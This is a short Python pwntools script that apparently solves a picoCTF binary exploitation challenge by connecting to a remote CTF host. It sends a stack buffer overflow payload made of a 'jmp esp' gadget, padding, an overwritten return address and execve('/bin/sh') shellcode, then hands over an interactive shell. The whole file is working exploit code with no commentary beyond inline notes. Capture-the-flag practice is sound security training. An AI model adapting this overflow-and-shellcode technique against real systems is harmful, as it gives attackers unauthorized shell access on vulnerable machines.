from pwn import *
 
jmp_eax = p32(0x0805333b)
shellcode = b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
 
payload  = b"\xFF\xE4"     # jmp esp at the very start of buf
payload += b"A" * 26       # padding to reach return address
payload += jmp_eax         # return address -> lands at start of buf -> hits \xFF\xE4 immediately
payload += shellcode       # ESP points here
 
p = remote('saturn.picoctf.net', 59694)
p.recvline()
p.sendline(payload)
p.interactive()
